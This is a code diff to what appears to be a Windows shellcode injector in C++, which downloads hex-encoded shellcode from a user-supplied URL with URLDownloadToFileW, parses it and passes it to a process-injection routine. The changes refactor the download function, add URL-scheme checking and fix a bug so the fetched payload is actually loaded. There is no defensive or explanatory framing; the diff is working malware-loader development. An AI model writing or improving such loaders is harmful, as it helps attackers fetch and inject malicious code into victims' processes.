@@ -8,6 +8,7 @@
 #include <tlhelp32.h>
 #include <stdlib.h>
 #include <Urlmon.h>
+#include <algorithm>  
 #pragma comment(lib, "Urlmon.lib")
 
 #pragma comment(lib, "wininet.lib")
@@ -66,19 +67,20 @@ BOOL Injector(HANDLE hProcess, HANDLE hThread, const std::vector<char>& buf) {
     return TRUE;
 }
 
-bool FetchRemoteShellcode(const wchar_t* srcURL) {
-
-    const wchar_t* destFile = L"input.txt";
-    if (S_OK == URLDownloadToFileW(NULL, srcURL, destFile, 0, NULL))
-    {
-        printf("[+] Fetched Remote file");
+bool FetchRemoteShellcode(const std::wstring& srcURL, const std::wstring& destFile) {
+    if (S_OK == URLDownloadToFileW(NULL, srcURL.c_str(), destFile.c_str(), 0, NULL)) {
+        std::wcout << L"[+] Successfully fetched remote file: " << destFile << std::endl;
         return true;
-    }
-    else
-    {     
+    } else {
+        std::wcerr << L"Failed to fetch remote file." << std::endl;
         return false;
     }
+}
 
+bool ValidUrlScheme(const std::string& url) {
+    std::string lowerUrl = url;
+    std::transform(lowerUrl.begin(), lowerUrl.end(), lowerUrl.begin(), ::tolower);
+    return lowerUrl.rfind("http://", 0) == 0 || lowerUrl.rfind("https://", 0) == 0;
 }
 
 void PrintHelpMenu(const std::string& programName) {
@@ -131,16 +133,23 @@ int main(int argc, char* argv[]) {
 
     std::vector<char> payload;
 
-    if (!inputContent.empty()) {
-        payload = Parser(inputContent);
-    }
-    else if (!remoteUrl.empty()) {
-        std::wstring widestr = std::wstring(remoteUrl.begin(), remoteUrl.end());
-        const wchar_t* url = widestr.c_str();
-        if (!FetchRemoteShellcode(url)) {
-           inputContent = "input.txt";
-           payload = Parser(inputContent);
-                }
+     if (!remoteUrl.empty()) {
+		 
+		if (!ValidUrlScheme(remoteUrl)) {
+            remoteUrl = "http://" + remoteUrl;
+ 
+        }
+
+		
+        std::wstring remoteUrlW(remoteUrl.begin(), remoteUrl.end());
+        std::wstring destFile = L"input.txt";
+
+        if (!FetchRemoteShellcode(remoteUrlW, destFile)) {
+            std::cerr << "Failed to download the shellcode." << std::endl;
+            return 1;
+        } else {
+            payload = Parser("input.txt");
+        }
     }
     else {
         std::cout << "Please specify an input file or remote file location with hex shellcode. Use -h for help menu." << std::endl;
